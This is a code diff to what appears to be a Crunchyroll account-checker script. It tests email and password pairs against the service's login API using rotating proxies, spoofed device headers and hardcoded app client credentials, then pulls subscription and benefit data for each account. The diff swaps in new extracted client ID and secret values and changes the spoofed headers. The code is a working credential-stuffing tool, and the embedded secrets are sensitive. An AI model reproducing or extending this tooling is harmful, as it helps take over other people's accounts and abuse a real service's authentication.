@@ -45,8 +45,8 @@ ACCOUNT_URL = "https://beta-api.crunchyroll.com/accounts/v1/me"
 SUBS_URL_TEMPLATE = "https://beta-api.crunchyroll.com/subs/v3/subscriptions/{}"
 BENEFITS_URL_TEMPLATE = "https://beta-api.crunchyroll.com/subs/v1/subscriptions/{}/benefits"
 
-CLIENT_ID = "ajcylfwdtjjtq7qpgks3"
-CLIENT_SECRET = "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_"
+CLIENT_ID = "y2arvjb0h0rgvtizlovy"
+CLIENT_SECRET = "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2"
 USER_AGENT = "Crunchyroll/deviceType: MeowMal; appVersion: 4.10.0; osVersion: 12; model: MeowMal; manufacturer: Amazon; brand: Amazo"
 
 proxies_list = []
@@ -166,11 +166,16 @@ def check_account(email, password):
         
         headers = {
             "Host": "beta-api.crunchyroll.com",
+            "Accept": "application/json",
+            "Accept-Charset": "UTF-8",
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "User-Agent": USER_AGENT,
             "etp-anonymous-id": session_id,
             "Connection": "Keep-Alive",
-            "Accept-Encoding": "gzip"
+            "Accept-Encoding": "gzip",
+            "x-MeowMal": "@MeowMal",
+            "x-Meow": "@MeowMal",
+            "x-MeowMal": "@MeowMal"
         }
         
         try:
@@ -181,7 +186,7 @@ def check_account(email, password):
                 "scope": "offline_access",
                 "client_id": CLIENT_ID,
                 "client_secret": CLIENT_SECRET,
-                "device_type": "MeowMal",
+                "device_type": "Oppo",
                 "device_id": device_id,
                 "device_name": "MeowMal"
             }
@@ -222,8 +227,14 @@ def check_account(email, password):
             if not access_token or not account_id:
                 continue
 
-            auth_headers = headers.copy()
-            auth_headers["Authorization"] = f"Bearer {access_token}"
+            auth_headers = {
+                "Host": "beta-api.crunchyroll.com",
+                "authorization": f"Bearer {access_token}",
+                "etp-anonymous-id": session_id,
+                "accept-encoding": "gzip",
+                "if-modified-since": "Sun, 14 Apr 2024 17:28:31 GMT",
+                "User-Agent": USER_AGENT
+            }
             
             country = "N/A"
             external_id = None
